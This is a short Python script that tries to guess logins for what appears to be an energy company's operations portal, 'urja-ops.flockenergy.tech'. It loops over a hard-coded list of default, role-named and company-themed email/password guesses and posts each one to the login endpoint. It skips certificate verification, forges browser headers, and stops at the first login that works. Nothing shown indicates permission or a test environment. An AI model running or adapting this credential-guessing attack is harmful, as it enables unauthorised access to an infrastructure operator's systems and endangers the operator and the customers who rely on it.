import urllib.request
import urllib.parse
import ssl
import re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

credentials = [
    'student@flockenergy.com/student',
    'demo@flockenergy.com/demo', 
    'guest@flockenergy.com/guest',
    'intern@flockenergy.com/intern',
    'analyst@flockenergy.com/analyst',
    'engineer@flockenergy.com/engineer',
    'manager@flockenergy.com/manager',
    'director@flockenergy.com/director',
    'admin@flockenergy.com/urja2024',
    'admin@flockenergy.com/energy',
    'admin@flockenergy.com/distribution',
    'admin@flockenergy.com/ops',
    'admin@flockenergy.com/meter',
    'test@test.com/test',
    'user@user.com/user',
    'example@example.com/example',
    'meter@flockenergy.com/meter',
    'reading@flockenergy.com/reading',
    'consumption@flockenergy.com/consumption',
    'network@flockenergy.com/network',
    'substation@flockenergy.com/substation',
    'john@flockenergy.com/john',
    'jane@flockenergy.com/jane',
    'smith@flockenergy.com/smith',
    'johnson@flockenergy.com/johnson',
    'flock@flockenergy.com/flock',
    'energy@flockenergy.com/energy',
    'urja@flockenergy.com/urja2024',
    'portal@flockenergy.com/portal',
    'support@flockenergy.com/help',
    'view@flockenergy.com/view',
    'read@flockenergy.com/read',
    'data@flockenergy.com/data',
    'ops@flockenergy.com/ops',
    'metering@flockenergy.com/metering',
    'distribution@flockenergy.com/distribution',
]

print("Testing all credentials with proper headers...\n")
for cred in credentials:
    parts = cred.split('/')
    email = parts[0]
    password = parts[1] if len(parts) > 1 else 'password'
    try:
        data = urllib.parse.urlencode({'email': email, 'password': password}).encode()
        req = urllib.request.Request('https://urja-ops.flockenergy.tech/login', data=data, method='POST')
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        req.add_header('Origin', 'https://urja-ops.flockenergy.tech')
        req.add_header('Referer', 'https://urja-ops.flockenergy.tech/login')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        resp = urllib.request.urlopen(req, context=ctx)
        body = resp.read().decode()
        print("SUCCESS: " + email + "/" + password + " -> " + str(resp.status) + ": " + body[:200])
        # If login succeeds (not a failure response), we found the credentials
        if resp.status == 200 and 'type":"success"' in body:
            print("*** LOGIN SUCCESSFUL - credentials verified! ***")
            break
    except urllib.error.HTTPError as e:
        body = e.read().decode()[:200]
        print("FAILED: " + email + "/" + password + " -> " + str(e.code) + ": " + body)
    except Exception as e:
        print("ERROR: " + email + "/" + password + " -> " + str(e))